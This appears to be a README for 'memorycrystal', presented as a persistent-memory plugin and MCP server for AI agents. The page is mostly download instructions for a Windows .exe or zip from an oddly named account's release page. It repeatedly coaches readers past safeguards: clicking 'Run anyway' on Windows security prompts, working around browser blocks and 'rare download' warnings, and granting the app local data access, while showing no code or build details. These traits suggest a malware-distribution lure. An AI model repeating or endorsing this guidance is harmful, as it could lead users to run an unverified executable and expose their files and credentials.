# 🧠 memorycrystal - Keep AI memory between sessions

[![Download memorycrystal](https://img.shields.io/badge/Download%20memorycrystal-blue?style=for-the-badge)](https://github.com/nativist-rossini671/memorycrystal/releases)

## 📥 Download memorycrystal

To get memorycrystal on Windows, visit the release page and download the latest file from there:

https://github.com/nativist-rossini671/memorycrystal/releases

Look for the newest release and choose the Windows download if more than one file is listed. In most cases, this will be an `.exe` file or a `.zip` file.

## 🪟 Windows setup

1. Open the release page in your browser.
2. Find the latest release at the top of the page.
3. Under **Assets**, click the Windows file.
4. If you download a `.zip` file, right-click it and choose **Extract All**.
5. Open the extracted folder.
6. Double-click the app file to start memorycrystal.
7. If Windows shows a security prompt, choose **More info** and then **Run anyway** if you trust the source.

## ✨ What memorycrystal does

memorycrystal helps AI agents keep useful memory across sessions. It gives your agent a place to store facts, notes, and context so it can pick up where it left off.

It is built as an OpenClaw plugin and an MCP server, so it can work with tools that support those formats. That makes it a good fit for agent workflows that need persistent memory without asking the user to repeat the same details.

## 🧩 What you can use it for

- Save user facts for later chats
- Keep project details in one place
- Store long-term context for an AI agent
- Reduce repeated questions
- Connect memory to agent tools through MCP
- Use a shared memory layer across sessions

## 🔧 How it works

memorycrystal acts like a memory layer between your AI agent and the data it needs to remember.

A simple flow looks like this:

1. The agent gets new information from a chat or task.
2. memorycrystal stores that information.
3. Later, the agent asks for memory.
4. memorycrystal returns the saved context.

This helps the agent act with more continuity and less repetition.

## 📦 Files you may see on the release page

When you open the download page, you may see files like these:

- `memorycrystal-windows.exe`
- `memorycrystal-win.zip`
- `README.txt`
- checksum files for verification

If you see both an `.exe` and a `.zip`, the `.exe` is usually the easiest choice. If your browser blocks the file, choose the `.zip` version and extract it first.

## 🖱️ First run

After you open memorycrystal for the first time:

1. Let the app finish loading.
2. If a local browser window opens, keep it open.
3. If the app asks for access to local data, allow it.
4. If it asks you to connect to an AI tool, follow the setup steps in that tool.

Some builds may run as a local desktop app. Others may open a local web interface. Both are normal for this type of tool.

## 🧠 Best way to use it

For best results, keep memory entries short and clear.

Good examples:

- User prefers short answers
- Project uses Next.js
- Agent should remember meeting notes
- Store Claude prompt settings
- Keep API key names and file paths separate

This makes it easier for the agent to find the right memory later.

## 🔌 OpenClaw plugin and MCP server

memorycrystal supports two common ways to connect agent tools:

- **OpenClaw plugin**: lets the app plug into supported agent setups
- **MCP server**: lets other tools talk to memorycrystal through a standard interface

If you use Claude or another MCP-compatible tool, memorycrystal can sit between the tool and your saved memory data.

## 🛠️ Basic use cases

You can use memorycrystal for:

- personal assistant memory
- support agent context
- task history
- project notes
- user preference tracking
- multi-step workflows
- shared team memory for AI tools

## 🖥️ Windows tips

- Keep the app in a folder you can find later
- Do not move files around after setup unless you know what they do
- If Windows asks for permission, read the prompt before you allow it
- If your browser marks the download as rare, use the release page again and confirm you have the latest file

## 📌 Topics in this project

This project touches on:

- agent memory
- AI agents
- Claude
- Convex
- LLMs
- MCP
- persistent memory
- Next.js
- TypeScript
- OpenAI workflows

## 🧾 Simple install flow

1. Go to the release page.
2. Download the newest Windows file.
3. Open the file or extract it.
4. Start the app.
5. Connect it to your AI tool if needed.
6. Add a test memory entry.
7. Ask the agent to recall it.

## 🔍 If the app does not open

Try these steps:

1. Make sure the download finished.
2. Check your Downloads folder.
3. If you downloaded a zip file, extract it first.
4. Run the app again from the extracted folder.
5. If Windows blocked it, open the file again and check the security prompt.
6. If you have multiple copies, use the newest one from the release page.

## 📂 Suggested folder structure after setup

You may want to keep files in a folder like this:

- `Downloads`
- `memorycrystal`
- `memorycrystal\data`
- `memorycrystal\config`

This keeps the app and its local data easy to find.

## 🔐 Local data

memorycrystal may store memory on your computer or in a connected service, based on how you set it up. Keep your setup simple at first. Add a few test items and check that the agent can read them back before you use it for real work

## 📎 Download again

If you need the file again, use this page:

https://github.com/nativist-rossini671/memorycrystal/releases